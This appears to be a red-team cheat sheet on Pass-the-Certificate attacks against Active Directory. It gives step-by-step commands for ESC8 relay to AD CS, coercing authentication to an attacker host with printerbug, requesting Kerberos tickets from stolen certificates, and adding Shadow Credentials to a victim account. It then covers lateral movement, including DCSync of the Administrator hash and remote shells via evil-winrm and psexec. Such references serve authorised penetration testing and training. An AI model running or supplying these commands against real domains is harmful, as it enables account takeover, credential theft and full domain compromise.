# Pass-the-Certificate (PtC)

> _Use X.509 certificates to request TGTs via PKINIT. Essential for AD CS attacks (ESC8) and Shadow Credentials._

## 📚 Resources

- [Authenticating with certificates when pkinit is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)

### 🛠️ Tools

- [PKINITtools](https://github.com/dirkjanm/PKINITtools)
- [Certipy](https://github.com/ly4k/Certipy)
- [PassTheCert](https://github.com/AlmondNoodle/PassTheCert)
- [pywhisker](https://github.com/ShutdownRepo/pywhisker)

## 📌 Key Concepts

| Term                   | Description                                                                                    |
| ---------------------- | ---------------------------------------------------------------------------------------------- |
| **PKINIT**             | Kerberos extension allowing public key authentication (smartcards, certificates)               |
| **ESC8**               | NTLM relay attack to AD CS web enrollment endpoint -> obtain certificate for a machine account |
| **Shadow Credentials** | Abusing `msDS-KeyCredentialLink` attribute to add a public key to a user account               |
| **PFX / PKCS#12**      | Certificate file format containing both public cert + private key                              |

## ESC8 – NTLM Relay to AD CS Web Enrollment

> _Goal: Relay authentication -> get a certificate for a machine account (e.g., DC01$)_

### Step 1: Start ntlmrelayx on attacker machine

```bash
impacket-ntlmrelayx -t http://$CA_SERVER/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

### Step 2: Coerce victim to authenticate (printerbug example)

```bash
python3 printerbug.py $DOMAIN/$USER:$PASSWORD@$VICTIM_IP $ATTACKER_IP
```

### Step 3: Get certificate

- ntlmrelayx outputs `./$MACHINE_ACCOUNT$.pfx`

## Pass-the-Certificate -> TGT

### Using PKINITtools

::: code-group

```bash [Unix]
# Clone and install
git clone https://github.com/dirkjanm/PKINITtools.git

# Fix libcrypto error if needed
pip3 install -I git+https://github.com/wbond/oscrypto.git

# Request TGT using PFX
python3 gettgtpkinit.py -cert-pfx $PATH_TO_PFX -dc-ip $DC_IP $DOMAIN/$MACHINE_ACCOUNT$ $OUTPUT.ccache
```

```bash [Windows]
Rubeus.exe asktgt /user:$USER /certificate:$BASE64_CERT /password:$PFX_PASSWORD /ptt
```

:::

## Shadow Credentials (msDS-KeyCredentialLink)

> Goal: Add a public key to a victim user -> get TGT as that user

- [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c)

### Step 1: Add KeyCredentialLink

```bash
pywhisker --dc-ip $DC_IP -d $DOMAIN -u $CONTROLLED_USER -p $PASSWORD --target $VICTIM_USER --action add
```

### Step 2: Request TGT as victim

```bash
python3 gettgtpkinit.py -cert-pfx $PFX_FILE -pfx-pass $PFX_PASSWORD -dc-ip $DC_IP $DOMAIN/$VICTIM_USER $OUTPUT.ccache
```

### Step 3: Use the TGT

```bash
export KRB5CCNAME=$OUTPUT.ccache
klist
```

::: code-group

```bash [evil-winrm]
evil-winrm -i $TARGET -r $DOMAIN
```

```bash [nxc]
nxc winrm $DC_IP -k --use-kcache
# or
nxc winrm $DC_IP -u $USER -H $HASH
```

:::

### 4. After TGT Obtained – Lateral Movement

```bash
export KRB5CCNAME=/path/to/ticket.ccache

# DCSync (if machine account)
impacket-secretsdump -k -no-pass -dc-ip $DC_IP -just-dc-user Administrator $DOMAIN/$MACHINE_ACCOUNT$@$DC_HOSTNAME

# WinRM
evil-winrm -i $TARGET -r $DOMAIN

# SMB
impacket-psexec -k -no-pass $DOMAIN/$USER@$TARGET
```
